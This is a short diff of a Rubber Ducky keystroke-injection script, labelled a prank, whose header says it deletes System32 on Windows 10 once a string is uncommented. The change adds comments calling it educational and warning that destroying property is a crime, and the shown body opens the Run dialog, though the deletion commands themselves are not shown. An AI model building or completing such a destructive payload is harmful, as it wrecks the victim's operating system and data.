@@ -4,11 +4,13 @@ REM Target: Win, tested on 10
 REM Props: Hak5, my friends and memes
 REM Version: 1.0
 REM Category: Prank
-REM D as in DELETE! Deletes System32.
+REM D as in DELETE! Deletes System32. I wrote the draft with my friend as an educational lesson to show them just how easy it is to write ducky, I then combed through MS doc's on those 3 commands to refine them and tested later for this.
 REM
 REM THIS WILL DELETE THINGS AND MAKE COMPUTER UNHAPPY
 REM Uncomment out the string below to arm the script.
 REM Also... don't be a dick to n00bs. =)
+REM For educational/sysadmin purposes, as a reminder destruction of property IS A CRIME!
+REM As always just follow the golden rule "DON"T BE A DICK!"
 REM
 DELAY 500
 GUI r
